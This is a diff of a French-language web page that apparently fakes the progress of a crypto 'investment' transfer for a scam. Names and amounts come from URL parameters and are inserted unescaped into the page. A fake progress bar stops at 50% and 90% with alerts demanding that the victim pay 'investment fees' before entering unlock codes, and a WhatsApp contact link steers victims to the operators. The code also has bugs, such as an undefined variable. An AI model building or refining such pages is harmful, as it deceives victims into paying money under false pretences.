@@ -11,7 +11,7 @@
       padding: 0;
       box-sizing: border-box;
     }
-  
+
     .background-image {
       position: fixed;
       top: 0;
@@ -23,7 +23,7 @@
       z-index: -1;
       filter: brightness(0.5);
     }
-  
+
     body {
       background-color: #14151a;
       display: flex;
@@ -35,7 +35,7 @@
       font-family: Arial, sans-serif;
       color: #eaecef;
     }
-  
+
     .interface {
       text-align: center;
       padding: 20px;
@@ -48,14 +48,14 @@
       width: 600px;
       z-index: 1;
     }
-  
+
     .transfer-text {
       font-size: 16px;
       margin-bottom: 10px;
       text-align: center;
       display: block;
     }
-  
+
     .progress-container {
       width: 100%;
       background-color: #2c2f36;
@@ -65,7 +65,7 @@
       display: none;
       margin-top: 20px;
     }
-  
+
     .progress-bar {
       height: 100%;
       font-size: 14px;
@@ -76,7 +76,7 @@
       font-weight: bold;
       color: black;
     }
-  
+
     .button {
       background-color: #f3ba2f;
       color: #14151a;
@@ -88,26 +88,25 @@
       display: inline-block;
       font-weight: bold;
     }
-  
+
     .button:hover {
       background-color: #d6a521;
       transform: scale(1.05);
     }
-  
+
     .error-message {
       color: #ff4c4c;
       font-weight: bold;
       margin-top: 10px;
-      display: none;
     }
-  
+
     .whatsapp-icon {
       position: fixed;
       bottom: 20px;
       right: 20px;
       z-index: 1000;
     }
-  
+
     .whatsapp-icon img {
       width: 60px;
       height: 60px;
@@ -115,81 +114,137 @@
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
       transition: transform 0.3s ease;
     }
-  
+
     .whatsapp-icon img:hover {
       transform: scale(1.1);
+    }
+
+    .err {
+      display: none;
+    }
+
+    #err.active {
+      display: block;
+    }
+
+    #err.active {
+      display: block;
     }
   </style>
 </head>
 
 <body>
-    <div class="background-image"></div>
+  <div class="background-image"></div>
 
-    <div class="interface" id="investor-info">
+  <div class="interface" id="investor-info">
+  </div>
+
+  <div class="interface">
+    <div class="transfer-text" style="color:#f3ba2f" id="invest">En attente des fonds d'investissement</div>
+
+    <div class="progress-container">
+      <div class="progress-bar" id="progress-bar">0%</div>
     </div>
 
-    <div class="interface">
-      <div class="transfer-text" style="color:#f3ba2f" id="invest">En attente des fonds d'investissement</div>
+    <p class="error-message" id="error-msg"></p>
 
-      <div class="progress-container">
-        <div class="progress-bar" id="progress-bar">0%</div>
-      </div>
-
-      <p class="error-message" id="error-msg">Erreur : Vous devez payer les frais de la carte investisseur.</p>
-
-      <div style="display: flex; justify-content: center; gap: 10px; margin-top: 10px;">
-        <input type="button" value="Démarrer l'investissement" class="button" id="btn-deblock">
-      </div>
+    <div style="display: flex; justify-content: center; gap: 10px; margin-top: 10px;">
+      <input type="button" value="Démarrer l'investissement" class="button" id="btn-deblock">
     </div>
+  </div>
 
-    <script>
-      const urlParams = new URLSearchParams(window.location.search);
-      const investorName = urlParams.get('investorName') || "Non renseigné";
-      const transactionNumber = urlParams.get('transactionNumber') || "Non renseigné";
-      const network = urlParams.get('network') || "Non renseigné";
-      const totalAmount = urlParams.get('totalAmount') || "Non renseigné";
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const investorName = urlParams.get('investorName') || "Non renseigné";
+    const transactionNumber = urlParams.get('transactionNumber') || "Non renseigné";
+    const network = urlParams.get('network') || "Non renseigné";
+    const totalAmount = urlParams.get('totalAmount') || "Non renseigné";
 
-      document.getElementById('investor-info').innerHTML = `
+    document.getElementById('investor-info').innerHTML = `
             <div class="transfer-text"><strong>Nom de l'investisseur :</strong> ${investorName}</div>
             <div class="transfer-text"><strong>Numéro de transaction :</strong> ${transactionNumber}</div>
             <div class="transfer-text"><strong>Réseau utilisé :</strong> ${network}</div>
             <div class="transfer-text"><strong>Montant total à recevoir :</strong> ${totalAmount}</div>
         `;
 
-      document.querySelector('#btn-deblock').addEventListener('click', () => {
-        let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
-        if (code2 === "2078") {
-          startProgressBar();
-          document.querySelector('#invest').innerText = "En cours d'investissement...";
-          document.querySelector('#btn-deblock').style.display = 'none';
-        } else {
-          alert("Code incorrect");
-        }
-      });
-
-      function startProgressBar() {
-        let progress = 0;
-        const progressBar = document.getElementById('progress-bar');
-        const progressContainer = document.querySelector('.progress-container');
-        const errorMsg = document.getElementById('error-msg');
-
-        progressContainer.style.display = 'block';
-
-        let interval = setInterval(() => {
-          if (progress < 97) {
-            progress += 1;
-            progressBar.style.width = progress + '%';
-            progressBar.innerText = progress + '%';
-          } else {
-            clearInterval(interval);
-            errorMsg.style.display = 'block';
-          }
-        }, 1200);
+    document.querySelector('#btn-deblock').addEventListener('click', () => {
+      let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
+      if (code2 === "0000") {
+        startProgressBar();
+        document.querySelector('#invest').innerText = "En cours d'investissement...";
+        document.querySelector('#btn-deblock').style.display = 'none';
+      } else {
+        alert("Code incorrect");
       }
-    </script>
-    <a href="https://wa.me/+22602252587" target="_blank" class="whatsapp-icon">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-    </a>
+    });
+
+    let err1 = document.getElementById('err1');
+    let err2 = document.getElementById('err2');
+    const errorMsg = document.getElementById('error-msg');
+
+
+    function startProgressBar() {
+      let progress = 0;
+      const progressBar = document.getElementById('progress-bar');
+      const progressContainer = document.querySelector('.progress-container');
+
+      progressContainer.style.display = 'block';
+
+
+      function updateProgress() {
+        if (progress < 90) {
+          progress += 1;
+          progressBar.style.width = progress + '%';
+          progressBar.innerText = progress + '%';
+
+        } else {
+          clearInterval(interval); // Arrête la progression à 90%
+          errorMsg.innerHTML = "Erreur : Félicitations Cher client. Veuillez payer les fonds d'investissement pour finaliser.";
+          alert("Erreur : Félicitations Cher client. Veuillez payer les fonds d'investissement pour finaliser.");
+          const userCode = prompt(`Veuillez entrer le code pour continuer `);
+          if (userCode === "5678") {
+            alert("Investissement terminé !");
+            window.location.href = `inverstir.html?auth=verified&cash=${totalAmount}`;
+          } else {
+            alert("Code incorrect. Veuillez réessayer en rechargeant la page.");
+            progressBar.style.width = `${checkpoint}%`;
+            progressBar.innerText = `${checkpoint}%`;
+          }
+
+        }
+      }
+
+      function handleCodePrompt(err_msg, expectedCode) {
+        clearInterval(interval); // Arrête la progression
+        alert(err_msg);
+        const userCode = prompt(`Veuillez entrer le code pour continuer `);
+        if (userCode === expectedCode) {
+          interval = setInterval(updateProgress, 500); // Reprend la progression
+        } else {
+          alert("Code incorrect. Veuillez réessayer.");
+          progressBar.style.width = `${checkpoint}%`;
+          progressBar.innerText = `${checkpoint}%`;
+          // Reprendre la progression même après un code incorrect
+          interval = setInterval(updateProgress, 500);
+        }
+      }
+
+      let interval = setInterval(() => {
+        if (progress === 50) {
+          clearInterval(interval); // Arrête la progression à 50%
+          setInterval.innerHTML = "Erreur : Cher client veuillez payer les frais d'investissement afin de finaliser votre investissement.";
+          handleCodePrompt("Erreur : Cher client veuillez payer les frais d'investissement afin de finaliser votre investissement.", "1234"); // Demande le code à 50%
+        } else {
+          updateProgress(); // Continue la progression
+        }
+      }, 500);
+    }
+
+
+  </script>
+  <a href="https://wa.me/22602252587" target="_blank" class="whatsapp-icon">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+  </a>
 
 
 </body>
